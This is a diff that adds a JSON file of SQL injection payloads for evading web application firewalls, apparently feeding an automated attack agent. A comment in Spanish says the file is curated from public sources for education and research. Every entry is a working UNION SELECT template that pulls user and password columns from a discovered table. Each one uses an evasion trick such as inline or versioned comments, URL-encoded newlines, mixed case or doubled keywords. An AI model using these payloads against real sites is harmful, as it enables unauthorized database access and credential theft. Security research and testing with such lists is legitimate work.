@@ -1,0 +1,19 @@
+{
+  "_about": "Repertorio de tecnicas/payloads de evasion de WAF conocidos, curado de fuentes publicas (uso educativo/investigacion). El agente lo consulta como conocimiento adicional. {q}=comilla, {table}/{ucol}/{pcol} se rellenan con el esquema descubierto.",
+  "_sources": [
+    "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md",
+    "https://github.com/0xInfection/Awesome-WAF"
+  ],
+  "bypass_payloads": [
+    {"name": "inline comments", "payload": "-1{q}/**/UNION/**/SELECT/**/{ucol},{pcol}/**/FROM/**/{table}-- -"},
+    {"name": "union all", "payload": "-1{q} UNION ALL SELECT {ucol},{pcol} FROM {table}-- -"},
+    {"name": "mixed case", "payload": "-1{q} uNiOn SeLeCt {ucol},{pcol} fRoM {table}-- -"},
+    {"name": "versioned comment", "payload": "-1{q}/*!50000UNION*//*!50000SELECT*/{ucol},{pcol}/*!50000FROM*/{table}-- -"},
+    {"name": "newline whitespace", "payload": "-1{q}%0aUNION%0aSELECT%0a{ucol},{pcol}%0aFROM%0a{table}-- -"},
+    {"name": "parentheses", "payload": "-1{q} UNION SELECT({ucol}),({pcol}) FROM {table}-- -"},
+    {"name": "hash terminator", "payload": "-1{q} UNION SELECT {ucol},{pcol} FROM {table}#"},
+    {"name": "scientific no-space", "payload": "-1{q}UNION SELECT {ucol},{pcol} FROM {table}-- -"},
+    {"name": "backticks", "payload": "-1{q} UNION SELECT `{ucol}`,`{pcol}` FROM `{table}`-- -"},
+    {"name": "double keywords", "payload": "-1{q} UNIunionON SELselectECT {ucol},{pcol} FRfromOM {table}-- -"}
+  ]
+}
